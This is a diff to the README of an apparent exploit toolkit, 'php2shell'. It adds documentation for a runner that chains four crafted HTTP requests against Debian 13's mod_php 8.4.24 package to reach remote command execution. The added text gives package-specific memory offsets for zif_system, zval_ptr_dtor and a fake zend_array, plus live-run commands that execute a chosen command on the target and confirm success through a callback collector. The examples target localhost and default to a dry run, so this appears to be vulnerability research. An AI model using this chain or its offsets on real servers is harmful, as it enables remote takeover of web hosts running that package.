@@ -25,6 +25,7 @@ Stage sources: `receipts/diag3_10_runs/`, `docs/validation_1021_filmpost.md`.
 | path | contents |
 |---|---|
 | `tool/php2shell.py` | driver CLI (`--step recon\|chain`) |
+| `tool/debian8424.py` | standalone Debian 13 `libapache2-mod-php8.4` 8.4.24 four-stage runner (A1→B1→A2→B2); dry default, additive to the profile/COMPACT chain |
 | `tool/run`, `tool/__main__.py` | `./tool/run`, `python -m tool` |
 | `tool/modules/arm.py` | multipart `PHP_SESSION_UPLOAD_PROGRESS` builders, HTTP framing, 14-byte disclosure analyzer |
 | `tool/modules/native-output-leak-stock-arm.py` | STOCK arm body (author-provided reconstruction) |
@@ -63,7 +64,52 @@ python3 -m tool --target wiki --step recon          # same via package entry
 ./tool/php2shell.py --target modphp --step producer --producer unser --memory-limit 2M  # unser payload, byte-build only, no send
 ./tool/php2shell.py --target wiki --step write_stage --main-chunk 0x7f8875a00000   # byte-build only, no send
 ./tool/php2shell.py --url http://127.0.0.1:28840/index.php --profile realapps-pie --step recon
+python3 -m tool.debian8424 --url http://127.0.0.1:8080/ --dry-run
 ```
+
+## Debian 13 mod_php 8.4.24 runner
+
+`tool/debian8424.py` is a separate, research-derived runner for the exact Debian
+package `libapache2-mod-php8.4 8.4.24-1~deb13u1` (`libphp8.4.so` 5,980,008 B).
+It is deliberately **not** a `--profile` entry and does not alter the existing
+FPM/COMPACT `--step chain` semantics. It regenerates and hash-checks the four
+bodies, then sends one A1 → B1 → A2 → B2 sequence.
+
+Required target shape: prefork mod_php, `output_buffering=4096`, and one
+22-byte PHP endpoint (`<?php echo "OK\n"; ?>`). Package calibration:
+
+| constant | value |
+|---|---|
+| A2 fillers | `116` |
+| fake `zend_array` | `S = main + 0xF7398` |
+| `zif_system` | `lib + 0x24cdd0` |
+| `zval_ptr_dtor` | `lib + 0x424ff0` |
+
+Dry-run (default, opens no socket) writes the bodies and `result.json`:
+
+```sh
+python3 -m tool.debian8424 --url http://127.0.0.1:8080/ --dry-run
+```
+
+Live run with a local HTTP callback collector:
+
+```sh
+python3 -m tool.debian8424 --url http://127.0.0.1:8080/ \
+  --command id --lhost 127.0.0.1 --lport 9001 --timeout 180 \
+  --output files/io/debian8424-run1 --live
+```
+
+Use `--callback http://HOST:PORT` plus `--callback-log FILE` for an external
+collector, or `--proof-file PATH` / `--error-log PATH` when the runner shares
+the target's filesystem (bare-metal local use). Success is reported only when
+the marker is observed through one of those channels; a 200/500 response alone
+is not success. There is no `docker exec` and no container-filesystem read.
+
+Research notes: this chain is package-specific. Official `php:8.4.24-apache`
+has different symbols, A2 filler count and `S` anchor, so do not reuse those
+constants. B1 is probabilistic (one of the concurrent requests should hit the
+A1 child), and the B2 command must fit the 200-byte `ht` carrier. A1/B1/A2
+bodies are 1,060,211 / 33,128,677 / 279,432 B; B2 is 451,384 B.
 
 Not implemented:
 
